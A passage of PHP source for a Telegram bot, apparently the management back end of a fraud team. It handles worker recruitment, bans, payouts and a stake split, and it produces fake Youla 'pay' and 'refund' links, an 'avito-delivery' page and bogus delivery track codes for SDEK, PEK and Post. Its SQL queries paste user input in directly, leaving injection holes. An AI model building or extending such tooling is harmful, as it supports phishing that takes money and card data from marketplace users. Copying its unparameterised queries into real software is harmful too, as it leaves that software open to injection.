					$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $functions['getAdvert']['keyboard']['pay'], 'url' => $links['youla'].'/buy/'.$advert_id), Array('text' => $functions['getAdvert']['keyboard']['ref'], 'url' => $links['youla'].'/refund/'.$advert_id))));
				} else {
					$keyboard = Array('inline_keyboard' => Array(Array()));
				}
				
				if($advert['status'] == -1) {
					array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getAdvert']['keyboard']['show'], 'callback_data' => '/show/'.$advert_id.'/')));
				} elseif($advert['status'] > 0) {
					array_push($keyboard['inline_keyboard'], Array(Array('text' => $functions['getAdvert']['keyboard']['hide'], 'callback_data' => '/hide/'.$advert_id.'/')));
				}
			} else {
				$text = $functions['getAdvert']['not_used'];
			}
			
			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);
			
			mysqli_close($connection);
			unset($connection);
			unset($settings);
		}
	}
	
	if(!function_exists('showForums')) {
		function showForums($buttons = NULL) {
			global $functions;
			$text = str_replace("\t", "", $functions['showForums']['header']);
			
			$keyboard = Array('inline_keyboard' => Array());

			foreach ($functions['showForums']['links'] as $key => $value) {
				array_push($keyboard['inline_keyboard'], Array(Array('text' => $key, 'url' => $value)));
			}

			
		
			if($buttons == NULL) {
				return $text;
			} else {
				return json_encode($keyboard);
			}
		}
	}
	
	if(!function_exists('showRules')) {
		function showRules() {
			global $functions;

			$text = str_replace("\t","", sprintf($functions['showRules']['header'], ''));
			
			return $text;
		}
	}
	
	if(!function_exists('showSupport')) {
		function showSupport() {
		    global $functions;

			$text = str_replace("\t","", $functions['showSupport']['header']);
			
			return $text;
		}
	}
	
	if(!function_exists('showPayinfo')) {
		function showPayinfo() {
		    global $settings;
		    global $functions;
            $stake = explode(":", $settings['stake']);

            $text = str_replace("\t", "", sprintf($functions['showPayinfo']['header'], $stake[0], $stake[1]));
			
			return $text;
		}
	}
	
	if(!function_exists('showAbout')) {
		function showAbout($buttons = 0) {
			global $connection;
			global $settings;
			global $functions;
			
			$stake = explode(":", $settings['stake']);
			
			$text = str_replace("\t", "", sprintf($functions['showAbout']['header'], $stake[0], $stake[1]));
			
			$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $functions['showAbout']['keyboard']['rules'], 'callback_data' => '/showrules/')), Array(Array('text' => $functions['showAbout']['keyboard']['forums'], 'callback_data' => '/showforums/'))));
			
			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);
			
			mysqli_close($connection);
			unset($connection);
		}
	}
	
	if(!function_exists('showHelp')) {
		function showHelp($buttons = 0) {
			global $config;
			global $functions;

			$manuals = '';

			foreach ($functions['showHelp']['manuals'] as $key => $value) {
				$manuals .= "<a href=\"$value\">$key</a>\n";
			}

			$text = str_replace("\t", "", sprintf($functions['showHelp']['header'], $manuals, $config['invites']['payments']));

			$keyboard = Array('inline_keyboard' => Array(Array(Array('text' => $functions['showHelp']['keyboard']['commands'], 'callback_data' => '/showCommands/')), Array(Array('text' => $functions['showHelp']['keyboard']['screenshots'], 'url' => 'https://'.$_SERVER['SERVER_NAME'].'/pages/avito-delivery.html')),Array(Array('text' => $functions['showHelp']['keyboard']['support'], 'callback_data' => '/showSupport/')),Array(Array('text' => $functions['showHelp']['keyboard']['payouts'], 'callback_data' => '/showPayinfo/'))));
			
			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);
			
			
			unset($config);
		}
	}
	
	if(!function_exists('showCommands')) {
		function showCommands($buttons = 0) {
			global $config;
			global $functions;
			

			$text = str_replace("\t", "", $functions['showCommands']['header']);
			
			$keyboard = Array('inline_keyboard' => 
				Array(
					Array(
						Array('text' => $functions['showCommands']['keyboard']['workers'], 'url' => $config['invites']['workers']), 
						Array('text' => $functions['showCommands']['keyboard']['payouts'], 'url' => $config['invites']['payments'])
					), 
				));
				
			if($buttons == 0) return $text;
			if($buttons == 1) return json_encode($keyboard);
			
			unset($config);
		}		
	}

	$data = json_decode(file_get_contents('php://input'));
	
	if(isset($data)) {
		if(isset($callback)) {
			if(!empty($callback['from'])){
				$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `accounts` WHERE `telegram` = '$callback[from]'"));
				if($config['status'] == 0 AND $user['access'] < 666){
					send($config['token'], 'sendMessage', Array('chat_id' => $callback["from"], 'text' => $callbacks['bot_off'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					die($callbacks['bot_off']);
				}
			}

			if(preg_match('/^\/warn\/\d+\/$/', $callback['type'])) {
				$user_id = substr($callback['type'], 6, -1);
				$user_check = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$user_id'"));
				if($user_check['access'] >= 666) {
					$text = sprintf($callbacks['admin_warnban'], "варнишь");
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$query = mysqli_query($connection, "SELECT `telegram`, `access`, `warns` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");
					
					if(mysqli_num_rows($query) > 0) {
						$user = mysqli_fetch_assoc($query);
						
						if($user['warns'] < 3) {
							mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`+1 WHERE `telegram` = '$user_id' AND `access` > '0'");
							
							send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));
							$text = sprintf($callbacks['warn']['get_warn_admin'], $callback['from'], $callback['firstname'], $callback['lastname'], $user_id, $user['warns']+1);
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = sprintf($callbacks['warn']['get_wan_user'], $user['warns']+1);
							send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `warns` = `warns`+1 WHERE `telegram` = '$user_id'");
							mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
							mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
							mysqli_query($connection, "UPDATE `trackcodessdek` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
							mysqli_query($connection, "UPDATE `trackcodespek` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
							mysqli_query($connection, "UPDATE `trackcodespost` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
							
							send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
							send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
							
							send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));
							
							$text = sprintf($callbacks['warn']['get_warn_admin_ban'], $callback['from'], $callback['firstname'], $callback['lastname'], $user_id, $user['warns']+1);
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = sprintf($callbacks['warn']['get_wan_user_ban'], $user['warns']+1);
							send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					} else {
						$text = $callbacks['warn']['worker_not_exists'];
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				}
			}
				
			if(preg_match('/^\/ban\/\d+\/$/', $callback['type'])) {
				$user_id = substr($callback['type'], 5, -1);
				$user_check = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$user_id'"));
				if($user_check['access'] >= 666) {
					$text = sprintf($callbacks['admin_warnban'], "банешь");
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$search = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` != '-1'");
					if(mysqli_num_rows($search) > 0) {

						mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1' WHERE `telegram` = '$user_id'");
						mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
						mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
						mysqli_query($connection, "UPDATE `trackcodessdek` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
						mysqli_query($connection, "UPDATE `trackcodespek` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
						mysqli_query($connection, "UPDATE `trackcodespost` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
						
						send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
						send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time()+24*500*3600));
						
						send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

						$text = sprintf($callbacks['ban']['get_ban_admin'], $callback['from'], $callback['firstname'], $callback['lastname'], $user_id);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						$text = $callbacks['ban']['get_ban_user'];
						send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));					
					} else {
						$text = $callbacks['ban']['worker_not_exists'];
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				}
			}
			
			if(preg_match('/^\/unban\/\d+\/$/', $callback['type'])) {
				$user_id = substr($callback['type'], 7, -1);
				
				$search = mysqli_query($connection, "SELECT `telegram`, `access` FROM `accounts` WHERE `telegram` = '$user_id'");
				
				if(mysqli_num_rows($search) > 0) {
					$user = mysqli_fetch_assoc($search);
					
					if($user['access'] <= 0) {
						mysqli_query($connection, "UPDATE `accounts` SET `access` = '0', `warns` = '0' WHERE `telegram` = '$user_id'");
						
						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));
						
						send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));
						
						$text = sprintf($callbacks['unban']['get_unban_admin'], $callback['from'], $callback['firstname'], $callback['lastname'], $user_id);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						
						$text = $callbacks['unban']['get_unban_user'];
						send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} else {
						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
						send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));
						
						$text = $callbacks['unban']['worker_not_banned'];
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				} else {
					$text = $callbacks['unban']['worker_not_exists'];
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}
			
			if(preg_match('/\/adverts\/\d+\//', $callback['type'])) {
				$user_id = substr($callback['type'], 9, -1);
				
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['chat_id'], 'text' => getMyAdverts($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyAdverts($user_id, 1, 1)));
			}
			
			if(preg_match('/\/payoutlist\//', $callback['type'])) {
				$payouts = mysqli_query($connection, "SELECT * FROM `payouts` WHERE `worker` = '$callback[from]' ORDER by `id` DESC LIMIT 3");
				if(mysqli_num_rows($payouts) > 0){
					$text = $callbacks['payoutlist']['header'];
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
					$payouts_arr = [];
					while ($payout = mysqli_fetch_assoc($payouts)) {
						  $payouts_arr[] = ["amount" => $payout['amount'], "status" => $payout['status'], "time" => $payout['time']];
					}

					sort($payouts_arr);
					reset($payouts_arr);

					for($i = 0; $i < count($payouts_arr); $i++){
						$text = sprintf($callbacks['payoutlist']['item'], $payouts_arr[$i]['amount'], $callbacks['payoutlist']['statuses'][$payouts_arr[$i]['status']], date('d.m.Y H:i:s', $payouts_arr[$i]['time']));
						if($i == count($payouts_arr)-1){
							if($payouts_arr[$i]['status'] == '0'){
								$keyboard = Array('inline_keyboard' => Array(
									Array(
										Array('text' => $callbacks['payoutlist']['keyboard']['cancel'], 'callback_data' => "/payout/cancel/"),
									)
								));
								send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => json_encode($keyboard)));
							}else{
								send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
							}
						}else{
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
						}
						
					}
					
				}else{
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $callbacks['payoutlist']['errors']['not_exists'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
				}
			}

			if(preg_match('/\/join\/(\w+\/\d+|\w+\/|)/', $callback['type'])) {
				if($callback['type'] == '/join/') {
					$query = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `status` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` >= '0' AND `status` < '3' ORDER BY `id` DESC");
					
					if(mysqli_num_rows($query) > 0) {
						$request = mysqli_fetch_assoc($query);
						
						if($request['status'] == 1) {
							$text = str_replace("\t", "", sprintf($callbacks['join']['values'][$request['status']], $request['value1'], $request['value2'], $request['value3']));

							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $callbacks['join']['keyboard']['send'], 'callback_data' => '/join/send'), Array('text' => $callbacks['join']['keyboard']['cancel'], 'callback_data' => '/join/cancel/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						} elseif($request['status'] == 2) {
							$text = $callbacks['join']['values'][$request['status']];
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(empty($request['value1']) AND empty($request['value2']) AND empty($request['value3'])) {
							$text = $callbacks['join']['values']["3"];
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND empty($request['value2']) AND empty($request['value3'])) {
							$text = $callbacks['join']['values']["4"];
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND isset($request['value2']) AND empty($request['value3'])) {
							$text = $callbacks['join']['values']["5"];
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					} else {
						mysqli_query($connection, "INSERT INTO `requests` (`username`, `name`, `telegram`, `rules`, `status`, `time`) VALUES ('$callback[username]', 'none', '$callback[from]', '0', '0', '".time()."')");
						$text = str_replace("\t", "", $callbacks['join']['rules']['not_accept']);
						$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $callbacks['join']['keyboard']['accept'], 'callback_data' => '/join/accept/')))));
						send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'reply_markup' => $keyboard));
					}
				} elseif($callback['type'] == '/join/accept/') {
					mysqli_query($connection, "UPDATE `requests` SET `rules` = '1' WHERE `telegram` = '$callback[from]' AND `status` = '0'");
					$text =  str_replace("\t", "", $callbacks['join']['rules']['accepted']);
					send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'reply_markup' => ''));
					$text = $callbacks['join']['values']['3'];
					$keyboard = Array('inline_keyboard' => Array(
						Array(
							Array('text' => $callbacks['join']['value1']['keyboard']['forum'], 'callback_data' => '/join/type/0'),
							Array('text' => $callbacks['join']['value1']['keyboard']['target'], 'callback_data' => '/join/type/1')
						),
						Array(
							Array('text' => $callbacks['join']['value1']['keyboard']['friend'], 'callback_data' => '/join/type/2'),
							Array('text' => $callbacks['join']['value1']['keyboard']['other'], 'callback_data' => '/join/type/3'),
						)
					));
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
					$text = str_replace("\t", "", sprintf($callbacks['join']['waiting'], $callback['from'], $callback['firstname'], $callback['lastname'], $request['value1'], $request['value2'], $request['value3']));
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} elseif($callback['type'] == '/join/send/') {
					$query = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`,`value1_type` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` = '1' ORDER BY `id` DESC");
					
					if(mysqli_num_rows($query) > 0) {
						$request = mysqli_fetch_assoc($query);
						mysqli_query($connection, "UPDATE `requests` SET `status` = '2' WHERE `id` = '$request[id]'");
						$text = str_replace("\t", "", sprintf($callbacks['join']['new'], 
							$callback['from'], 
							$callback['firstname']." ".$callback['lastname'],
							$callbacks['join']['value1']['values'][$request['value1_type']],
							$request['value1'], 
							$request['value2'], 
							$request['value3']
						));
						$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $callbacks['join']['keyboard']['approve'], 'callback_data' => '/join/approve/'.$request['id']), Array('text' => $callbacks['join']['keyboard']['reject'], 'callback_data' => '/join/reject/'.$request['id'])))));

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['supports'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						$text = $callbacks['join']['values']['6'];

						send($config['token'], 'editMessageReplyMarkup', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'reply_markup' => ''));

						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

						$text = sprintf($callbacks['join']['send'], $callback['from'], $callback['firstname'], $callback['lastname']);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					} 
				} elseif($callback['type'] == '/join/cancel/') {
					$query = mysqli_query($connection, "SELECT `id` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` >= '0' AND `status` < '3' ORDER BY `id` DESC");
					
					if(mysqli_num_rows($query) > 0) {
						$request = mysqli_fetch_assoc($query);
						
						mysqli_query($connection, "UPDATE `requests` SET `status` = '-1' WHERE `id` = '$request[id]'");
						$text = $callbacks['join']['deleted'];
						send($config['token'], 'editMessageReplyMarkup', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'reply_markup' => ''));
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						$text = sprintf($callbacks['join']['rejected'], $callback['from'], $callback['firstname'], $callback['lastname']);
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				} elseif(preg_match('/\/join\/type\/\d{0,9}/', $callback['type'])) {
					$query = mysqli_query($connection, "SELECT * FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` >= '0' AND `status` < '3' ORDER BY `id` DESC");

					if(mysqli_num_rows($query) > 0){
						$type = substr($callback['type'], 11);
						$request = mysqli_fetch_assoc($query);
						mysqli_query($connection, "UPDATE `requests` SET `value1_type` = '$type' WHERE `id` = '$request[id]'");

						$text = $callbacks['join']['value1']['asks'][$type];
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				} elseif(preg_match('/\/join\/approve\/\d{0,9}/', $callback['type'])) {
					$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");
					if(mysqli_num_rows($isAccess) > 0) {
						$request_id = substr($callback['type'], 14);
						
						$access = mysqli_fetch_assoc($isAccess);
						if($access['access'] >= 100) $rank = 'Помощник';
						if($access['access'] >= 500) $rank = 'Модератор';
						
						$query = mysqli_query($connection, "SELECT `username`, `name`, `telegram`, `value1`, `value2`, `value3`, `value1_type` FROM `requests` WHERE `id` = '$request_id' AND `status` = '2'");
						
						if(mysqli_num_rows($query) > 0) {
							$request = mysqli_fetch_assoc($query);
							$users = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$request[telegram]'");
							$msg = array_diff(explode(',', trim($request['msg'])), Array(NULL));
							if(mysqli_num_rows($users) > 0) {
								mysqli_query($connection, "UPDATE `requests` SET `status` = '3' WHERE `id` = '$request_id'");
								mysqli_query($connection, "UPDATE `accounts` SET `username` = '$request[username]', `access` = '1', `stake` = '$settings[stake]' WHERE `telegram` = '$request[telegram]'");
							} else {
								mysqli_query($connection, "UPDATE `requests` SET `status` = '3' WHERE `id` = '$request_id'");
								$permitted_chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
							    $user_tag = substr(str_shuffle($permitted_chars), 0, 10);
								mysqli_query($connection, "INSERT INTO `accounts` (`username`, `telegram`, `access`, `stake`, `created`, `user_tag`) VALUES ('$request[username]', '$request[telegram]', '1', '$settings[stake]', '".time()."', '$user_tag')");
							}
							
							send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $request['telegram']));
							send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $request['telegram']));
							
							$text = str_replace("\t", "", sprintf($callbacks['join']['new'], 
								$request['telegram'], 
								$request['name'],
								$callbacks['join']['value1']['values'][$request['value1_type']],
								$request['value1'], 
								$request['value2'], 
								$request['value3']
							));

							$text .= sprintf($callbacks['join']['accepted_admin'], $rank, $callback['from'], $callback['firstname'], $callback['lastname']);

							send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['supports'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
							$text = $callbacks['join']['accepted_user'];

							send($config['token'], 'sendMessage', Array('chat_id' => $request['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $defaultKeyboard));
							
							$text = $callbacks['join']['chats'];

							$keyboard = Array('inline_keyboard' => Array(
								Array(Array('text' => $functions['showCommands']['keyboard']['workers'], 'url' => $config['invites']['workers']), Array('text' => $functions['showCommands']['keyboard']['payouts'], 'url' => $config['invites']['payments'])), 
							));

							send($config['token'], 'sendMessage', Array('chat_id' => $request['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));

							$text = sprintf($callbacks['join']['accept'], $rank, $callback['from'], $callback['firstname'], $callback['lastname'], $request['telegram'], $request['name']);
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				} elseif(preg_match('/\/join\/reject\/\d{0,9}/', $callback['type'])) {
					$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");
					
					if(mysqli_num_rows($isAccess) > 0) {
						$request_id = substr($callback['type'], 13);
						
						$access = mysqli_fetch_assoc($isAccess);
						if($access['access'] >= 100) $rank = 'Помощник';
						if($access['access'] >= 500) $rank = 'Модератор';
						
						$query = mysqli_query($connection, "SELECT `name`, `telegram`, `value1`, `value2`, `value3`, `value1_type` FROM `requests` WHERE `id` = '$request_id' AND `status` = '2'");
		
						if(mysqli_num_rows($query) > 0) {
							$request = mysqli_fetch_assoc($query);
							$msg = array_diff(explode(',', trim($request['msg'])), Array(NULL));
							mysqli_query($connection, "UPDATE `requests` SET `status` = '-1' WHERE `id` = '$request_id'");
							$text = str_replace("\t", "", sprintf($callbacks['join']['new'], 
								$request['telegram'], 
								$request['name'],
								$callbacks['join']['value1']['values'][$request['value1_type']],
								$request['value1'], 
								$request['value2'], 
								$request['value3']
							));

							$text .= sprintf($callbacks['join']['reject_admin'], $rank, $callback['from'], $callback['firstname'], $callback['lastname']);

							send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['supports'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
							$text = $callbacks['join']['reject_user'];
							send($config['token'], 'sendMessage', Array('chat_id' => $request['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = sprintf($callbacks['join']['reject_query'], $rank, $callback['from'], $callback['firstname'], $callback['lastname'], $request['telegram'], $request['name']);
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}
			}
			
			if(preg_match('/\/trackcode\/\d{6,12}\//', $callback['type'])) {
			    if(preg_match('/\/trackcode\/(\d+)\/(.+)\/ADM\/(\d+)\//', $callback['type'])){
			        preg_match('/\/trackcode\/(\d+)\/(.+)\/ADM\/(\d+)\//', $callback['type'], $result);
			        $code = $result[1];
			        $platform = $result[2];
			        $user_id = $result[3];
			        if($platform == 'BOX'){
    					$type = 0;
    				}elseif($platform == 'SDK'){
    					$type = 1;
    				}elseif ($platform == 'PEK') {
    					$type = 2;
    				}elseif ($platform == 'PST') {
    					$type = 3;
    				}
			        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => getTrack($user_id, $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getTrack($user_id, $code, 1, $type)));
			    }else{
			        $code = mb_substr($callback['type'], 11, -4);
    				$platform = mb_substr($callback['type'], -3);
    				if($platform == 'BOX'){
    					$type = 0;
    				}elseif($platform == 'SDK'){
    					$type = 1;
    				}elseif ($platform == 'PEK') {
    					$type = 2;
    				}elseif ($platform == 'PST') {
    					$type = 3;
    				}
    				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => getTrack($callback['from'], $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getTrack($callback['from'], $code, 1, $type)));
			    }
			}
			
			if(preg_match('/\/advert\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
			    if(preg_match('/\/advert\/(\d+)\/ADM\/(\d+)\//', $callback['type'])){
			        preg_match('/\/advert\/(\d+)\/ADM\/(\d+)\//', $callback['type'], $result);
			        $advert_id = $result[1];
			        $user_id = $result[2];
			        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => getAdvert($user_id, $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getAdvert($user_id, $advert_id, 1)));
